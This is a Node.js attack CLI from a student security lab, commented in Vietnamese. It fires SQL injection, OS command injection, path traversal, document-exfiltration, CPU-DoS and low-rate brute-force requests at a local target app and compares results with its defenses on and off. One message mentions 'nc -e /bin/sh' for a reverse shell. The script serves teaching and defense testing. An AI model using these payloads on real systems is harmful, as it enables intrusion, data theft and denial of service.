#!/usr/bin/env node
/**
 * ============================================================================
 * PBL4 - Layer 7 Application Attack & Firewall Bypass CLI
 * Phụ trách: Hoàng Trung (TV3) - Target App & Tấn công L7 (Task W4-T3)
 * ============================================================================
 * 
 * Công cụ dòng lệnh độc lập mô phỏng 6 kịch bản tấn công Tầng Ứng dụng (L7):
 * 1. SQL Injection (Bypass Login admin' --)
 * 2. OS Command Injection (Chạy lệnh shell qua Ping: 127.0.0.1; id)
 * 3. Path Traversal (Leo thang thư mục đọc file nhạy cảm: ../../package.json)
 * 4. Confidential Document Exfiltration (Rò rỉ tài liệu mật ID=5 & Bắt Flag)
 * 5. Heavy API / CPU DoS (Vắt kiệt CPU qua vòng băm SHA-256)
 * 6. Low-rate Brute Force (Dò mật khẩu tần suất thấp 1 req/s lách Firewall mạng)
 * 
 * Hỗ trợ chế độ so sánh trước/sau khi bật Khiên L3 (Defense Toggle Verification).
 */

const DEFAULT_TARGET = process.env.TARGET_APP_URL || 'http://localhost:18000';

// Màu sắc ANSI terminal
const C = {
  reset: '\x1b[0m',
  bold: '\x1b[1m',
  dim: '\x1b[2m',
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  magenta: '\x1b[35m',
  cyan: '\x1b[36m',
  white: '\x1b[37m',
  bgRed: '\x1b[41m',
  bgGreen: '\x1b[42m',
  bgYellow: '\x1b[43m',
  bgBlue: '\x1b[44m',
};

function banner() {
  console.log(`
${C.cyan}${C.bold}╔══════════════════════════════════════════════════════════════════════╗
║               PBL4 - L7 APPLICATION ATTACK TOOLKIT                   ║
║         Kịch Bản Tấn Công Tầng Ứng Dụng & Vượt Tường Lửa (W4-T3)     ║
║                    Phụ trách: Hoàng Trung (TV3)                      ║
╚══════════════════════════════════════════════════════════════════════╝${C.reset}`);
}

function printUsage() {
  console.log(`
${C.bold}CÁCH SỬ DỤNG:${C.reset}
  node scripts/attack-l7.mjs [TÙY CHỌN]

${C.bold}TÙY CHỌN MỤC TIÊU:${C.reset}
  --target <url>       Địa chỉ Target Server (Mặc định: ${DEFAULT_TARGET})

${C.bold}CÁC ĐÒN TẤN CÔNG ĐỘC LẬP:${C.reset}
  --all                Chạy toàn bộ 6 kịch bản tấn công theo thứ tự
  --sqli               1. SQL Injection bypass đăng nhập (admin' --)
  --cmd                2. OS Command Injection thực thi shell (127.0.0.1; id)
  --traversal          3. Path Traversal leo thang thư mục (../../package.json)
  --exfil              4. Rò rỉ tài liệu mật & bóc tách Flag (Document ID=5)
  --dos                5. Heavy API DoS (Vắt kiệt CPU qua băm SHA-256)
  --brute              6. Low-rate Brute Force 1 req/s lách Firewall mạng

${C.bold}KIỂM SOÁT PHÒNG THỦ KHIÊN L3:${C.reset}
  --status             Xem trạng thái hiện tại của Khiên L3 trên Target Server
  --enable             BẬT toàn bộ Khiên L3 (SECURED)
  --disable            TẮT toàn bộ Khiên L3 (VULNERABLE)
  --toggle [flag]      Đảo trạng thái Master L3 hoặc cờ con (anti_sqli, rate_limit, input_sanitization)
  --compare            ${C.yellow}Chạy đòn đánh so sánh 2 vòng: Khiên TẮT vs Khiên BẬT (Demo hội đồng)${C.reset}

${C.bold}VÍ DỤ:${C.reset}
  node scripts/attack-l7.mjs --all
  node scripts/attack-l7.mjs --sqli --target http://localhost:8000
  node scripts/attack-l7.mjs --compare
  ./scripts/attack-l7.sh --all
`);
}

// Helper gửi HTTP Request có đo thời gian
async function sendRequest(baseUrl, path, options = {}) {
  const url = `${baseUrl.replace(/\/+$/, '')}${path}`;
  const start = performance.now();
  try {
    const res = await fetch(url, {
      ...options,
      headers: {
        'User-Agent': 'PBL4-L7-Attack-CLI/1.0',
        Accept: 'application/json, text/plain, */*',
        ...(options.headers || {}),
      },
      signal: AbortSignal.timeout(options.timeout || 10000),
    });
    const latency = Math.round((performance.now() - start) * 10) / 10;
    const contentType = res.headers.get('content-type') || '';
    let body = null;
    let rawText = '';
    if (contentType.includes('application/json')) {
      body = await res.json();
      rawText = JSON.stringify(body);
    } else {
      rawText = await res.text();
      body = rawText;
    }
    return {
      ok: res.ok,
      status: res.status,
      headers: res.headers,
      body,
      rawText,
      latency,
      error: null,
    };
  } catch (err) {
    const latency = Math.round((performance.now() - start) * 10) / 10;
    return {
      ok: false,
      status: 0,
      headers: new Headers(),
      body: null,
      rawText: '',
      latency,
      error: err.message || String(err),
    };
  }
}

// ----------------------------------------------------------------------------
// CÁC HÀM ĐIỀU KHIỂN PHÒNG THỦ (DEFENSE CONTROLS)
// ----------------------------------------------------------------------------
async function getDefenseStatus(target) {
  const res = await sendRequest(target, '/api/defense/status');
  if (!res.ok) {
    throw new Error(`Không thể kết nối đến Target Server (${target}): HTTP ${res.status} ${res.error || ''}`);
  }
  return res.body?.flags;
}

async function setDefenseShield(target, enabled) {
  const res = await sendRequest(target, '/api/defense/toggle', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({}),
  });
  // Nếu trạng thái chưa như mong muốn thì set thẳng
  const current = await getDefenseStatus(target);
  if (current.l3_master !== enabled) {
    await sendRequest(target, '/api/defense/toggle', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({}),
    });
  }
  return await getDefenseStatus(target);
}

function displayShieldStatus(flags) {
  console.log(`\n${C.bold}--- TRẠNG THÁI KHIÊN L3 TRÊN TARGET SERVER ---${C.reset}`);
  console.log(`  Master Shield (Toàn bộ):  ${flags.l3_master ? C.green + '● BẬT (SECURED)' : C.red + '○ TẮT (VULNERABLE)'}${C.reset}`);
  console.log(`  Anti-SQLi (Prepared Stmt): ${flags.anti_sqli ? C.green + '● BẬT' : C.red + '○ TẮT'}${C.reset}`);
  console.log(`  Input Sanitization:        ${flags.input_sanitization ? C.green + '● BẬT' : C.red + '○ TẮT'}${C.reset}`);
  console.log(`  Dynamic Rate Limiting:     ${flags.rate_limit ? C.green + '● BẬT' : C.red + '○ TẮT'}${C.reset}`);
}

// ----------------------------------------------------------------------------
// KỊCH BẢN 1: SQL INJECTION
// ----------------------------------------------------------------------------
async function attackSqli(target) {
  console.log(`\n${C.bold}${C.blue}▶ [KỊCH BẢN 1] SQL INJECTION (BYPASS ĐĂNG NHẬP)${C.reset}`);
  console.log(`${C.dim}  Mục tiêu: POST /api/auth/login với payload username = "admin' --"${C.reset}`);
  console.log(`${C.dim}  Mục đích: Biến vế mật khẩu thành comment SQL, chiếm quyền Admin không cần mật khẩu${C.reset}`);

  const payload = {
    username: "admin' --",
    password: "random_password_bypass_attempt",
  };

  const res = await sendRequest(target, '/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  });

  if (res.status === 200 && res.body?.access_token) {
    console.log(`  ${C.bgRed}${C.white} KHAI THÁC THÀNH CÔNG (VULNERABLE) ${C.reset}`);
    console.log(`  • Mã phản hồi: ${C.green}HTTP 200 OK${C.reset} (${res.latency}ms)`);
    console.log(`  • Chế độ máy chủ: ${C.yellow}${res.body.defense_mode || 'VULNERABLE_RAW_SQL'}${C.reset}`);
    console.log(`  • Tài khoản chiếm được: ${C.bold}${res.body.user?.username}${C.reset} (Role: ${res.body.user?.role})`);
    console.log(`  • JWT Token cấp phát: ${C.dim}${res.body.access_token.substring(0, 32)}...${C.reset}`);
    console.log(`  ${C.red}→ Hệ thống ghép chuỗi SQL thô, bypass xác thực hoàn toàn!${C.reset}`);
    return { success: true, bypassed: true, status: res.status };
  } else if (res.status === 401) {
    console.log(`  ${C.bgGreen}${C.white} PHÒNG THỦ THÀNH CÔNG (BLOCKED) ${C.reset}`);
    console.log(`  • Mã phản hồi: ${C.yellow}HTTP 401 Unauthorized${C.reset} (${res.latency}ms)`);
    console.log(`  • Thông báo từ chối: "${res.body?.message || 'Unauthorized'}"`);
    console.log(`  ${C.green}→ Khiên Anti-SQLi BẬT: Truy vấn dùng Prepared Statement (?) ngăn chặn SQLi tuyệt đối!${C.reset}`);
    return { success: true, bypassed: false, status: res.status };
  } else {
    console.log(`  ${C.red}✖ Lỗi không mong đợi: HTTP ${res.status} - ${res.error || res.rawText}${C.reset}`);
    return { success: false, error: res.error, status: res.status };
  }
}

// ----------------------------------------------------------------------------
// KỊCH BẢN 2: OS COMMAND INJECTION
// ----------------------------------------------------------------------------
async function attackCommandInjection(target) {
  console.log(`\n${C.bold}${C.blue}▶ [KỊCH BẢN 2] OS COMMAND INJECTION (MỞ ĐƯỜNG REVERSE SHELL)${C.reset}`);
  console.log(`${C.dim}  Mục tiêu: GET /api/system/network-ping?host=127.0.0.1; id${C.reset}`);
  console.log(`${C.dim}  Mục đích: Tiêm ký tự phân tách lệnh ';' để thực thi lệnh nhân Linux trên máy chủ${C.reset}`);

  const hostPayload = '127.0.0.1; id';
  const res = await sendRequest(target, `/api/system/network-ping?host=${encodeURIComponent(hostPayload)}`);

  if (res.status === 200 && res.body?.command_injection_bypassed) {
    console.log(`  ${C.bgRed}${C.white} KHAI THÁC THÀNH CÔNG (VULNERABLE) ${C.reset}`);
    console.log(`  • Mã phản hồi: ${C.green}HTTP 200 OK${C.reset} (${res.latency}ms)`);
    console.log(`  • Header cảnh báo: ${C.yellow}${res.headers.get('x-security-warning') || 'N/A'}${C.reset}`);
    console.log(`  • Lệnh được thực thi: ${C.cyan}${res.body.command}${C.reset}`);
    console.log(`  • Kết quả Shell trả về:\n${C.magenta}    ${(res.body.output || res.body.stdout || '').split('\n').join('\n    ')}${C.reset}`);
    console.log(`  ${C.red}→ Hacker có thể lợi dụng endpoint này để gọi 'nc -e /bin/sh' mở Reverse Shell!${C.reset}`);
    return { success: true, bypassed: true, status: res.status };
  } else if (res.status === 400 && res.body?.shield === 'L3_COMMAND_INJECTION_BLOCKED') {
    console.log(`  ${C.bgGreen}${C.white} PHÒNG THỦ THÀNH CÔNG (BLOCKED) ${C.reset}`);
    console.log(`  • Mã phản hồi: ${C.yellow}HTTP 400 Bad Request${C.reset} (${res.latency}ms)`);
    console.log(`  • Khiên kích hoạt: ${C.green}${res.body.shield}${C.reset}`);
    console.log(`  • Lý do từ chối: "${res.body.message}"`);
    console.log(`  ${C.green}→ Bộ lọc Input Sanitization đã phát hiện ký tự nguy hiểm [;] và chặn đứng lệnh shell!${C.reset}`);
    return { success: true, bypassed: false, status: res.status };
  } else {
    console.log(`  • Kết quả: HTTP ${res.status} (${res.latency}ms) - Output: ${res.rawText.substring(0, 100)}`);
    return { success: false, status: res.status };
  }
}

// ----------------------------------------------------------------------------
// KỊCH BẢN 3: PATH TRAVERSAL
// ----------------------------------------------------------------------------
async function attackPathTraversal(target) {
  console.log(`\n${C.bold}${C.blue}▶ [KỊCH BẢN 3] PATH TRAVERSAL (LEO THANG THƯ MỤC)${C.reset}`);
  console.log(`${C.dim}  Mục tiêu: GET /api/files/download?name=../../package.json${C.reset}`);
  console.log(`${C.dim}  Mục đích: Lợi dụng '../' để thoát khỏi thư mục /public và đọc file cấu hình máy chủ${C.reset}`);

  const traversalPayload = '../../package.json';
  const res = await sendRequest(target, `/api/files/download?name=${encodeURIComponent(traversalPayload)}`);

  if (res.status === 200) {
    console.log(`  ${C.bgRed}${C.white} KHAI THÁC THÀNH CÔNG (VULNERABLE) ${C.reset}`);
    console.log(`  • Mã phản hồi: ${C.green}HTTP 200 OK${C.reset} (${res.latency}ms)`);
    console.log(`  • Kích thước tệp đọc được: ${res.rawText.length} bytes`);
    console.log(`  • Trích xuất nội dung đọc lén được:`);
    console.log(`${C.cyan}    ${res.rawText.substring(0, 150).split('\n').join('\n    ')}...${C.reset}`);
    console.log(`  ${C.red}→ Hệ thống không kiểm tra biên thư mục, dữ liệu nhạy cảm của server bị lộ!${C.reset}`);
    return { success: true, bypassed: true, status: res.status };
  } else if (res.status === 400 && res.body?.shield === 'L3_INPUT_SANITIZATION_ACTIVE') {
    console.log(`  ${C.bgGreen}${C.white} PHÒNG THỦ THÀNH CÔNG (BLOCKED) ${C.reset}`);
    console.log(`  • Mã phản hồi: ${C.yellow}HTTP 400 Bad Request${C.reset} (${res.latency}ms)`);
    console.log(`  • Khiên kích hoạt: ${C.green}${res.body.shield}${C.reset}`);
    console.log(`  • Thông điệp từ chối: "${res.body.message}"`);
    console.log(`  ${C.green}→ Khiên Sanitization phát hiện chuỗi '../' và chặn truy cập ngoài phạm vi cho phép!${C.reset}`);
    return { success: true, bypassed: false, status: res.status };
  } else {
    console.log(`  • Kết quả: HTTP ${res.status} (${res.latency}ms) - ${res.rawText.substring(0, 100)}`);
    return { success: false, status: res.status };
  }
}

// ----------------------------------------------------------------------------
// KỊCH BẢN 4: CONFIDENTIAL DATA EXFILTRATION
// ----------------------------------------------------------------------------
async function attackDataExfiltration(target) {
  console.log(`\n${C.bold}${C.blue}▶ [KỊCH BẢN 4] RÒ RỈ TÀI LIỆU MẬT & BÓC TÁCH FLAG (DATA EXFILTRATION)${C.reset}`);
  console.log(`${C.dim}  Mục tiêu: GET /api/documents/5/download (Bản vẽ phần cứng R&D mật)${C.reset}`);
  console.log(`${C.dim}  Mục đích: Tải tài liệu bí mật nội bộ bị gắn cờ is_confidential=1 để đánh cắp Flag${C.reset}`);

  const res = await sendRequest(target, '/api/documents/5/download');

  if (res.status === 200) {
    const hasFlag = res.rawText.includes('FLAG{');
    console.log(`  ${C.bgRed}${C.white} KHAI THÁC THÀNH CÔNG (VULNERABLE) ${C.reset}`);
    console.log(`  • Mã phản hồi: ${C.green}HTTP 200 OK${C.reset} (${res.latency}ms)`);
    console.log(`  • Cảnh báo an ninh: ${C.yellow}${res.headers.get('x-security-warning') || 'Confidential-Leak'}${C.reset}`);
    if (hasFlag) {
      const match = res.rawText.match(/FLAG\{[^}]+\}/);
      console.log(`  • ${C.bgYellow}${C.white} 🚩 CHIẾM ĐƯỢC FLAG BẢO MẬT: ${match ? match[0] : 'FLAG'} ${C.reset}`);
    }
    console.log(`  ${C.red}→ Tài liệu nghiên cứu mật bị rò rỉ hoàn toàn ra ngoài mạng!${C.reset}`);
    return { success: true, bypassed: true, status: res.status };
  } else if (res.status === 403 && res.body?.shield === 'L3_CONFIDENTIAL_POLICY_ACTIVE') {
    console.log(`  ${C.bgGreen}${C.white} PHÒNG THỦ THÀNH CÔNG (BLOCKED) ${C.reset}`);
    console.log(`  • Mã phản hồi: ${C.yellow}HTTP 403 Forbidden${C.reset} (${res.latency}ms)`);
    console.log(`  • Khiên kích hoạt: ${C.green}${res.body.shield}${C.reset}`);
    console.log(`  • Chính sách bảo vệ: "${res.body.message}"`);
    console.log(`  ${C.green}→ Chính sách kiểm soát truy cập L3 đã ngăn chặn việc tải tài liệu mật!${C.reset}`);
    return { success: true, bypassed: false, status: res.status };
  } else {
    console.log(`  • Kết quả: HTTP ${res.status} (${res.latency}ms) - ${res.rawText.substring(0, 100)}`);
    return { success: false, status: res.status };
  }
}

// ----------------------------------------------------------------------------
// KỊCH BẢN 5: HEAVY API / CPU DoS
// ----------------------------------------------------------------------------
async function attackHeavyDos(target) {
  console.log(`\n${C.bold}${C.blue}▶ [KỊCH BẢN 5] HEAVY ENDPOINT DoS (VẮT KIỆT CPU BẰNG BĂM SHA-256)${C.reset}`);
  console.log(`${C.dim}  Mục tiêu: Bắn chùm request tốn tải CPU: GET /api/reports/analytics?iterations=150000${C.reset}`);
  console.log(`${C.dim}  Mục đích: Ép Node.js Event Loop xử lý băm mật mã liên tục, kiểm chứng Dynamic Rate Limit${C.reset}`);

  console.log(`  Bắn chuỗi 12 request tính toán nặng liên tiếp...`);
  const results = [];
  let blockedCount = 0;
  let successCount = 0;

  for (let i = 1; i <= 12; i++) {
    const res = await sendRequest(target, '/api/reports/analytics?iterations=120000');
    if (res.status === 200) {
      successCount++;
      process.stdout.write(`${C.green}✓${C.reset}`);
    } else if (res.status === 429) {
      blockedCount++;
      process.stdout.write(`${C.red}⛔${C.reset}`);
    } else {
      process.stdout.write(`${C.yellow}?${C.reset}`);
    }
    results.push(res);
  }
  console.log('');

  const firstSuccess = results.find((r) => r.status === 200);
  const firstBlocked = results.find((r) => r.status === 429);

  if (firstSuccess) {
    console.log(`  • Thời gian xử lý phép toán CPU: ${C.yellow}${firstSuccess.body?.computation_time_ms || firstSuccess.latency}ms${C.reset}`);
    console.log(`  • Mức tải CPU máy chủ: ${C.magenta}${firstSuccess.body?.server_load || 'HIGH'}${C.reset}`);
  }

  if (blockedCount > 0) {
    console.log(`  ${C.bgGreen}${C.white} PHÒNG THỦ RATE LIMIT THÀNH CÔNG ${C.reset}`);
    console.log(`  • Đã chặn: ${C.bold}${blockedCount}/12${C.reset} request với mã ${C.yellow}HTTP 429 Too Many Requests${C.reset}`);
    console.log(`  • Khiên kích hoạt: ${C.green}${firstBlocked?.body?.shield || 'L3_RATE_LIMIT_ACTIVE'}${C.reset}`);
    console.log(`  ${C.green}→ Cửa sổ trượt (Sliding Window Log) đã bóp nghẹt đòn DoS, bảo vệ Event Loop!${C.reset}`);
    return { success: true, bypassed: false, blockedCount };
  } else {
    console.log(`  ${C.bgRed}${C.white} KHAI THÁC THÀNH CÔNG (RATE LIMIT TẮT) ${C.reset}`);
    console.log(`  • Toàn bộ 12/12 request đều ép CPU thực thi băm SHA-256 thành công (Không bị chặn 429)`);
    console.log(`  ${C.red}→ Máy chủ đang chịu tải cao, có nguy cơ treo dịch vụ nếu bị spam liên tục!${C.reset}`);
    return { success: true, bypassed: true, blockedCount: 0 };
  }
}

// ----------------------------------------------------------------------------
// KỊCH BẢN 6: LOW-RATE BRUTE FORCE
// ----------------------------------------------------------------------------
async function attackLowRateBruteForce(target) {
  console.log(`\n${C.bold}${C.blue}▶ [KỊCH BẢN 6] LOW-RATE BRUTE FORCE (LÁCH QUA TƯỜNG LỬA MẠNG)${C.reset}`);
  console.log(`${C.dim}  Mục tiêu: Dò mật khẩu với tần suất thấp (~1 req/s) vào POST /api/auth/login${C.reset}`);
  console.log(`${C.dim}  Nguyên lý: Tường lửa L1 (iptables) chỉ chặn bão > 50 pps. Tấn công chậm rãi lách qua L1,${C.reset}`);
  console.log(`${C.dim}            chỉ có Khiên L3 (Dynamic Rate Limiting) mới có thể phát hiện và bóp nghẹt.${C.reset}`);

  const passwords = [
    '123456',
    'password',
    'admin123',
    'qwerty',
    'engineer2026',
    'pass123', // Mật khẩu đúng của engineer_user
  ];

  console.log(`  Tiến hành thử ${passwords.length} mật khẩu cho tài khoản [engineer_user] cách nhau 600ms...`);

  let cracked = false;
  let rateLimited = false;

  for (let i = 0; i < passwords.length; i++) {
    const pwd = passwords[i];
    const res = await sendRequest(target, '/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: 'engineer_user', password: pwd }),
    });

    if (res.status === 200 && res.body?.access_token) {
      console.log(`  [Thử ${i + 1}/${passwords.length}] Password: "${pwd}" → ${C.green}MẬT KHẨU ĐÚNG! Đăng nhập thành công (HTTP 200)${C.reset}`);
      cracked = true;
      break;
    } else if (res.status === 429) {
      console.log(`  [Thử ${i + 1}/${passwords.length}] Password: "${pwd}" → ${C.red}BỊ CHẶN BỞI KHIÊN L3 RATE LIMIT (HTTP 429)!${C.reset}`);
      rateLimited = true;
      break;
    } else {
      console.log(`  [Thử ${i + 1}/${passwords.length}] Password: "${pwd}" → ${C.yellow}Sai mật khẩu (HTTP 401)${C.reset}`);
    }

    // Nghỉ 600ms giữa các lần thử (mô phỏng low-rate)
    await new Promise((r) => setTimeout(r, 600));
  }

  if (rateLimited) {
    console.log(`  ${C.bgGreen}${C.white} PHÒNG THỦ THÀNH CÔNG ${C.reset}`);
    console.log(`  ${C.green}→ Đòn Brute Force lách qua được tường lửa L1 nhưng bị chặn đứng bởi Khiên L3!${C.reset}`);
  } else if (cracked) {
    console.log(`  ${C.bgRed}${C.white} KHAI THÁC THÀNH CÔNG ${C.reset}`);
    console.log(`  ${C.red}→ Kẻ tấn công đã dò ra mật khẩu hợp lệ của người dùng qua tấn công tần suất thấp!${C.reset}`);
  }
}

// ----------------------------------------------------------------------------
// CHẾ ĐỘ SO SÁNH 2 VÒNG (COMPARE MODE)
// ----------------------------------------------------------------------------
async function runCompareMode(target) {
  console.log(`\n${C.magenta}${C.bold}══════════════════════════════════════════════════════════════════════${C.reset}`);
  console.log(`${C.magenta}${C.bold}        CHẾ ĐỘ DIỄN TẬP SO SÁNH: KHIÊN L3 TẮT (OFF) VS BẬT (ON)         ${C.reset}`);
  console.log(`${C.magenta}${C.bold}══════════════════════════════════════════════════════════════════════${C.reset}`);

  // VÒNG 1: TẮT KHIÊN
  console.log(`\n${C.bgRed}${C.white} >>> BƯỚC 1: TẮT TOÀN BỘ KHIÊN L3 (HỆ THỐNG MANG LỖ HỔNG) <<< ${C.reset}`);
  await setDefenseShield(target, false);
  const offFlags = await getDefenseStatus(target);
  displayShieldStatus(offFlags);

  console.log(`\n--- Bắt đầu bắn 4 đòn khai thác khiên TẮT ---`);
  const r1_sqli = await attackSqli(target);
  const r1_cmd = await attackCommandInjection(target);
  const r1_trav = await attackPathTraversal(target);
  const r1_exfil = await attackDataExfiltration(target);

  // VÒNG 2: BẬT KHIÊN
  console.log(`\n${C.bgGreen}${C.white} >>> BƯỚC 2: BẬT TOÀN BỘ KHIÊN L3 (KÍCH HOẠT PHÒNG THỦ CHIỀU SÂU) <<< ${C.reset}`);
  await setDefenseShield(target, true);
  const onFlags = await getDefenseStatus(target);
  displayShieldStatus(onFlags);

  console.log(`\n--- Bắt đầu bắn lại 4 đòn khai thác khiên BẬT ---`);
  const r2_sqli = await attackSqli(target);
  const r2_cmd = await attackCommandInjection(target);
  const r2_trav = await attackPathTraversal(target);
  const r2_exfil = await attackDataExfiltration(target);

  // BẢNG TỔNG KẾT
  console.log(`\n${C.bold}══════════════════════════════════════════════════════════════════════${C.reset}`);
  console.log(`${C.bold}                     BẢNG ĐỐI CHIẾU THỰC NGHIỆM L7                     ${C.reset}`);
  console.log(`══════════════════════════════════════════════════════════════════════`);
  console.log(`Kịch Bản Tấn Công            | Khiên L3 TẮT (OFF)      | Khiên L3 BẬT (ON)`);
  console.log(`─────────────────────────────┼─────────────────────────┼──────────────────────`);
  console.log(`1. SQL Injection (Login)     | ${r1_sqli.bypassed ? C.red + 'VULNERABLE (200 OK)' : 'N/A'}    ${C.reset}| ${!r2_sqli.bypassed ? C.green + 'BLOCKED (401)' : 'FAIL'}     ${C.reset}`);
  console.log(`2. OS Command Injection      | ${r1_cmd.bypassed ? C.red + 'VULNERABLE (Shell Ex)' : 'N/A'}  ${C.reset}| ${!r2_cmd.bypassed ? C.green + 'BLOCKED (400)' : 'FAIL'}     ${C.reset}`);
  console.log(`3. Path Traversal (Files)    | ${r1_trav.bypassed ? C.red + 'VULNERABLE (Read File)' : 'N/A'}${C.reset}| ${!r2_trav.bypassed ? C.green + 'BLOCKED (400)' : 'FAIL'}     ${C.reset}`);
  console.log(`4. Confidential Exfiltration | ${r1_exfil.bypassed ? C.red + 'VULNERABLE (Flag Leak)' : 'N/A'}${C.reset}| ${!r2_exfil.bypassed ? C.green + 'BLOCKED (403)' : 'FAIL'}     ${C.reset}`);
  console.log(`══════════════════════════════════════════════════════════════════════`);
  console.log(`${C.green}${C.bold}KẾT LUẬN: Toàn bộ 4 lỗ hổng L7 đều được bảo vệ triệt để khi Khiên L3 kích hoạt!${C.reset}\n`);
}

// ----------------------------------------------------------------------------
// HÀM ĐIỀU PHỐI CHÍNH
// ----------------------------------------------------------------------------
async function main() {
  banner();

  const args = process.argv.slice(2);

  if (args.includes('--help') || args.includes('-h')) {
    printUsage();
    return;
  }

  let target = DEFAULT_TARGET;

  // Trích xuất tham số --target
  const targetIdx = args.indexOf('--target');
  if (targetIdx !== -1 && args[targetIdx + 1]) {
    target = args[targetIdx + 1];
  }

  // Kiểm tra kết nối trước
  try {
    const health = await sendRequest(target, '/api/system/health', { timeout: 3000 });
    if (!health.ok) {
      console.log(`${C.yellow}⚠️  Cảnh báo: Không kết nối được Target Server tại [${target}].${C.reset}`);
      console.log(`   Đang thử cổng fallback nội bộ http://localhost:8000 ...`);
      const fallback = await sendRequest('http://localhost:8000', '/api/system/health', { timeout: 2000 });
      if (fallback.ok) {
        target = 'http://localhost:8000';
        console.log(`   ${C.green}✓ Đã tìm thấy Target Server tại http://localhost:8000!${C.reset}`);
      } else {
        console.log(`   ${C.red}✖ Target Server chưa chạy. Hãy khởi chạy bằng:${C.reset}`);
        console.log(`     ./scripts/integration-lab.sh up`);
        console.log(`     hoặc: cd target-app/server && npm run start:dev\n`);
        process.exit(1);
      }
    }
  } catch (err) {
    console.log(`${C.red}✖ Lỗi kết nối tới ${target}: ${err.message}${C.reset}`);
    process.exit(1);
  }

  console.log(`  ${C.dim}Target Server: ${C.bold}${target}${C.reset}`);

  if (args.length === 0 || args.includes('--help') || args.includes('-h')) {
    printUsage();
    const flags = await getDefenseStatus(target);
    displayShieldStatus(flags);
    return;
  }

  // Xử lý các lệnh điều khiển khiên
  if (args.includes('--status')) {
    const flags = await getDefenseStatus(target);
    displayShieldStatus(flags);
    return;
  }

  if (args.includes('--enable')) {
    console.log(`\n${C.yellow}→ Đang BẬT toàn bộ Khiên L3...${C.reset}`);
    const flags = await setDefenseShield(target, true);
    displayShieldStatus(flags);
    return;
  }

  if (args.includes('--disable')) {
    console.log(`\n${C.yellow}→ Đang TẮT toàn bộ Khiên L3...${C.reset}`);
    const flags = await setDefenseShield(target, false);
    displayShieldStatus(flags);
    return;
  }

  if (args.includes('--toggle')) {
    const flagIdx = args.indexOf('--toggle');
    const specificFlag = args[flagIdx + 1];
    const isSpecific = specificFlag && ['anti_sqli', 'rate_limit', 'input_sanitization'].includes(specificFlag);
    console.log(`\n${C.yellow}→ Đang đảo trạng thái khiên [${isSpecific ? specificFlag : 'Master L3'}]...${C.reset}`);
    await sendRequest(target, '/api/defense/toggle', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(isSpecific ? { flag: specificFlag } : {}),
    });
    const flags = await getDefenseStatus(target);
    displayShieldStatus(flags);
    return;
  }

  // Chế độ so sánh
  if (args.includes('--compare')) {
    await runCompareMode(target);
    return;
  }

  // Chạy các đòn tấn công
  const runAll = args.includes('--all');

  if (runAll || args.includes('--sqli')) {
    await attackSqli(target);
  }

  if (runAll || args.includes('--cmd')) {
    await attackCommandInjection(target);
  }

  if (runAll || args.includes('--traversal')) {
    await attackPathTraversal(target);
  }

  if (runAll || args.includes('--exfil')) {
    await attackDataExfiltration(target);
  }

  if (runAll || args.includes('--dos')) {
    await attackHeavyDos(target);
  }

  if (runAll || args.includes('--brute')) {
    await attackLowRateBruteForce(target);
  }

  console.log(`\n${C.green}✔ Hoàn tất kịch bản kiểm thử.${C.reset}\n`);
}

main().catch((err) => {
  console.error(`\n${C.red}Lỗi thực thi CLI:${C.reset}`, err);
  process.exit(1);
});
